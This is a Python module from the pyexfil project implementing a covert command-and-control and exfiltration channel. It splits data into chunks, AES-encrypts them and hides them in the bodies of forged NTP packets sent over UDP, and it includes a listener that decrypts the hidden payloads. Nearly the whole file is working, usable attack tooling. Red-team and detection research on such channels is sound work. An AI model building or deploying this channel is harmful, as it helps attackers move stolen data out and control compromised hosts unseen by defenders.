#!/usr/bin/env python3
"""
NTP Body C2 communication channel.

Usage:
    from pyexfil.Comm.NTP_Body.client import NTPComm

    # Send side
    ntp = NTPComm(host="192.168.1.1", enc_key="mykey")
    ntp.broadcast(b"hello C2")

    # Receive side (non-blocking)
    def handler(data, meta):
        print("Got:", data)

    ntp = NTPComm(host="0.0.0.0", enc_key="mykey", on_message=handler)
    ntp.listen(blocking=False)
"""

import socket
from typing import Callable, Optional

from pyexfil.includes.base import CommModule
from pyexfil.includes.prepare import _splitString
from pyexfil.includes.encryption_wrappers import AESEncryptOFB, AESDecryptOFB
from pyexfil.Comm.NTP_Body.ntp_consts import NTP_PORT, RECV_BUFFER, KEY, _buildNTP

NTP_HEADER_LEN = 16


class NTPComm(CommModule):
    """Bidirectional C2 channel using NTP packet bodies."""

    MODULE_NAME = "NTPBody"
    PROTOCOL    = "ntp/udp"

    def __init__(
        self,
        host: str,
        port: int = NTP_PORT,
        enc_key: bytes = KEY,
        on_message: Optional[Callable] = None,
        verbose: bool = False,
    ):
        super().__init__(enc_key="", on_message=on_message, verbose=verbose)
        self.host    = host
        self.port    = port
        self._raw_key = enc_key if isinstance(enc_key, bytes) else enc_key.encode("utf-8")

    # ------------------------------------------------------------------
    # Send / broadcast
    # ------------------------------------------------------------------

    def _send_impl(self, data, **kwargs) -> bool:
        return self._broadcast_impl(data, **kwargs)

    def _broadcast_impl(self, data, **kwargs) -> bool:
        if isinstance(data, str):
            data = data.encode("utf-8")

        host = kwargs.get("host", self.host)
        port = kwargs.get("port", self.port)

        chunks = _splitString(data, 16) if len(data) > 16 else [data]

        try:
            for chunk in chunks:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                header = _buildNTP()
                payload = AESEncryptOFB(key=self._raw_key, text=chunk)
                sock.sendto(header + payload, (host, port))
                sock.close()
        except socket.error as e:
            import sys
            import logging
            logging.error("[NTPBody] Send failed: %s", e)
            return False

        return True

    # ------------------------------------------------------------------
    # Listen side
    # ------------------------------------------------------------------

    def _listen_impl(self, callback: Callable, **kwargs) -> None:
        host = kwargs.get("host", self.host)
        port = kwargs.get("port", self.port)

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.bind((host, port))
        except socket.error as e:
            import sys
            sys.stderr.write("[NTPBody] Bind failed: %s\n" % e)
            return

        while not self._stop_event.is_set():
            try:
                s.settimeout(1.0)
                raw, addr = s.recvfrom(RECV_BUFFER)
            except socket.timeout:
                continue
            except socket.error:
                break

            if len(raw) <= NTP_HEADER_LEN:
                continue

            ciphertext = raw[NTP_HEADER_LEN:]
            try:
                plaintext = AESDecryptOFB(key=self._raw_key, data=ciphertext)
            except Exception:
                continue

            meta = {"sender_addr": addr}
            if self.on_message:
                self.on_message(plaintext, meta)
            callback(plaintext, meta)

        s.close()
